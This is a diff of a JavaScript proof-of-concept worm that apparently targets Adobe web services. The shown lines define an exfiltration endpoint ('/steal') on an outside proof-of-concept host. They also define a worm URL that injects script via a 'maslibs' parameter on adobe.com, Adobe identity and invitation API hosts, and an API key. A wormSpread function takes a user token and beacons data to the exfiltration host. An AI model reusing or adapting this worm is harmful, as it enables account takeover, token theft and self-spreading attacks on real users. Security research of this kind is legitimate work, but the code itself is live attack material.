@@ -20,7 +20,7 @@
  */
 
 const EXFIL    = 'https://nboyhu0n.instances.poc.jchunt.top/steal';
-const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=cdn.jsdelivr.net/gh/rootd4ddy/mas@main--mas--v11';
+const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=cdn.jsdelivr.net/gh/rootd4ddy/mas@main--mas--v12';
 const AB_HOST  = 'https://ab.adobe-identity.com';
 const INV_HOST = 'https://invitations.adobe.io';
 const API_KEY_AB  = 'CCHomeWeb1';
@@ -150,7 +150,7 @@ async function wormSpread(token) {
   // For PoC, the Express doc is pre-created via:
   //   POST https://new.express.adobe.com/service/das/documents/
   //   {"requestType":"createFromDocModel","docSpec":{"repo:name":"x.express","mimetype":"application/vnd.adobe.hz.express+dcx"},"docMetadata":{"docModelVersion":445},"respondWith":"metadata","docModel":"..."}
-  let urn = 'urn:aaid:sc:US:1d72b938-b499-4d74-ad6d-31c197e8a410';
+  let urn = 'urn:aaid:sc:US:8e3e28ae-4d63-4a16-95be-9d00bc102a75';
 
   if (!urn) {
     navigator.sendBeacon(`${EXFIL}?src=debug`, 'no_urn_found');
